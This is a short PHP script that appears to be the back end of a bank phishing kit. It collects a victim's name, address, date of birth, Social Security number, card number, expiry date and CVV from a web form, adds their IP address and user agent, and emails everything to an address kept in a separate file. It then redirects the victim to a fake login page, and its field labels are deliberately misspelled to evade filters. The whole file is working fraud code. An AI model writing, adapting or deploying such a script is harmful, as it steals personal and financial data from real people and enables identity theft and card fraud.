<?php
if($_POST["name"] != "" and $_POST["addr"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Wel'ls Info-----------------------\n";
$message .= "Full Name				: ".$_POST['name']."\n";
$message .= "Address            	: ".$_POST['addr']."\n";
$message .= "DOB	            	: ".$_POST['db']."\n";
$message .= "S.S,N	            	: ".$_POST['sn']."\n";
$message .= "C@rd Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       		: ".$_POST['ex']."\n";
$message .= "C,V.V            		: ".$_POST['vc']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Cl!ent |P: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Us3r Ag3nt : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>